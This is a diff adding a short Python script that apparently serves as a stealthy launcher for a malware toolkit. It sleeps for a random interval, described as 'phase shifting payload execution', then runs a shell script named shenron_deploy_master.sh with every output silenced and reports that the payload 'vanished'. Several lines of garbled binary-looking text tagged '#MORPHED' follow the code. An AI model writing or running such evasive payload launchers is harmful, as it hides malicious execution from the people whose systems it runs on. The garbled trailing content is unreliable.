@@ -1,0 +1,28 @@
+#!/usr/bin/env python3
+import os
+import random
+import subprocess
+import time
+
+def random_phase_shift():
+    delay = random.randint(10, 60)
+    print(f"[~] Phase shifting payload execution by {delay}s...")
+    time.sleep(delay)
+
+def temporal_phase(command):
+    random_phase_shift()
+    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    print("[‚úì] Temporal phase executed and vanished.")
+
+if __name__ == "__main__":
+    temporal_phase("bash ~/SHENRON/shenron_deploy_master.sh")
+
+iÅ©9öÒ!∆⁄#MORPHED
+
+ü»§æ#Nè“”µl}Ò#MORPHED
+
+ò7èΩ,∆/ÌJók™Êç¶	<ySÿı’îª2øéjÎŸà¶êó¿h1ˆ®ùKIT`#MORPHED
+
+0•_ë√Ëﬁ|ˇ{sÚ˛Î¯Pg∞máF›¡[1ødÙä]~ãâ#MORPHED
+
+z'√Fh|∆¡Àˆ"ﬁ#MORPHED
